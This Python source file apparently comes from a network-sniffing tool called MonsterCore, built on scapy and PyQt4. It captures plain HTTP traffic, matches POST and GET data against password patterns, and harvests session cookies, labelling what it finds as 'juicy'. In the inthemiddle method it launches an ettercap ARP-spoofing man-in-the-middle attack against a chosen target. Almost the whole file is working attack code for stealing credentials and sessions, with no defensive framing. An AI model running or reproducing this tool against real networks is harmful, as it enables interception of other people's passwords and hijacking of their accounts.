#!/usr/bin/python
# -*- coding: iso-8859-1 -*-
# this bitch is GPL

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys
import subprocess
import urllib
import time
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4.QtWebKit import *
from PyQt4.QtNetwork import *
import thread
from multiprocessing import Queue, Pipe, Process
import getopt
import MonsterLogger


class MonsterCore(QThread):

    """docstring for MonsterCore"""
    filename = False
    interface = False
    arp_target = False

    attacked = set()
    cookies = []
    parent_conn = None
    patterns = []

    def __init__(self, filename, interface, arp_target):
        super(MonsterCore, self).__init__()
        self.filename = filename
        self.interface = interface
        self.arp_target = arp_target
        self.my_ip = str(IP(dst="8.8.8.8").src)
        if filename:
            MonsterLogger.logger.info("reading packets in " + filename)
        if interface:
            MonsterLogger.logger.info(
                "IP address on " + interface + " is set to " + self.my_ip)
            MonsterLogger.logger.info(
                "Listening for HTTP traffic on " + interface)
        f = open("pattern.cfg", "r")
        for line in f.readlines():
            pt = []
            for item in line.split(" "):
                item = item.strip()
                pt.append(item)
            self.patterns.append(pt)

    def extractheader(self, data, header):

        for line in data.split("\n"):
            if line.startswith(header):  # and (line.endswith("\r") or line.endswith("\n")):
                line = line.strip()
                line = line.split("GET")[0]
                line = line.split("POST")[0]
                return line[len(header + ": "):]
        return ""

    def extractPwd(self, juicyInfo):
        MonsterLogger.logger.error("juicyInfo: " + juicyInfo)
        for pattern in self.patterns:
            matched = True
            MonsterLogger.logger.error("pattenr:" + str(pattern))
            for item in pattern:
                if juicyInfo.find(item) == -1:
                    matched = False
                    break
            if matched:
                MonsterLogger.logger.critical("find pwd info!")
                MonsterLogger.logger.critical(
                    "matched mattern: " + str(pattern))
                MonsterLogger.printJuicyForm(juicyInfo)
                return True

    def ontothosepackets(self, pkt):
        if not IP in pkt:
            return

        if not TCP in pkt:
            return

        data = str(pkt['TCP'].payload)
        url = "/"
        try:
            if data.startswith("POST"):
                MonsterLogger.logger.error("post pkt!")
                juicyInfo = data[data.find("\r\n\r\n") + 4:]
                uri = data[4:data.find("\r\n")][:data.find("HTTP")].strip()
            elif data.startswith("GET"):
                juicyInfo = data[3:data.find(
                    "\r\n")][:data.find("HTTP")].strip()
                uri = juicyInfo
            else:
                return
        except IndexError as e:
            # invalid pkt
            return

        host = self.extractheader(data, "Host")
        source = str(pkt['IP'].src)
        useragent = self.extractheader(data, "User-Agent")

        if self.extractPwd(juicyInfo):
            MonsterLogger.storeForm(useragent, host, uri, juicyInfo)
        if (len(data.split("Cookie")) < 1):
            return
        cookie = self.extractheader(data, "Cookie")

        MonsterLogger.storeCookie(useragent, host, uri, cookie)

        if Ether in pkt:
            ssid = "Ether"
        else:
            '''to save calculation time, just assume ssid is in first Dot11Elt
            <Dot11Elt  ID=SSID len=14 info='MERCURY_xxxxx'''
            if Dot11Elt in pkt:
                ssid = pkt[Dot11Elt][0].info
            else:
                ssid = "Unknown"
        if host and cookie and self.my_ip != None:
            MonsterLogger.logger.critical("cookie found!")
            self.emit(SIGNAL("cookieFound"), (
                ssid, source, host), cookie, useragent)
            # self.model.addCookie(("ASUS",source,host), cookie)
            # self.attack(source, host, cookie, useragent)
        return

    def printcookiejar(self):
        olddomain = ""
        print " [info] cookiejar so far ======================================\n"
        for cookie in self.cookies:
            if (cookie.domain() != olddomain):
                print " \n  for domain: " + cookie.domain()
                olddomain = cookie.domain()
            print "\t cookiename: " + cookie.name()
        print "\n\n =============================================================="

    def inthemiddle(self):

        ettercap_command = "ettercap -oD -M arp:remote /" + \
            str(self.arp_target) + "/ -i " + self.interface
        os.popen(ettercap_command)
        return

    def handlepkt(self, pkt):
        self.ontothosepackets(pkt)

    def sniff(self):
        '''@todo: maybe we can let user specify more ports to listen on '''
        if self.filename:
            sniff(offline=self.filename, prn=self.handlepkt,
                  filter="tcp port http", store=0)
        elif self.interface:
            if self.arp_target:
                self.inthemiddle()
            self.handleMonitor()

    def handleMonitor(self):
        sniff(self.interface, prn=self.handlepkt,
              filter="tcp port http", store=0)

    def run(self):
        self.sniff()

    def stopMonitor(self):
        pass
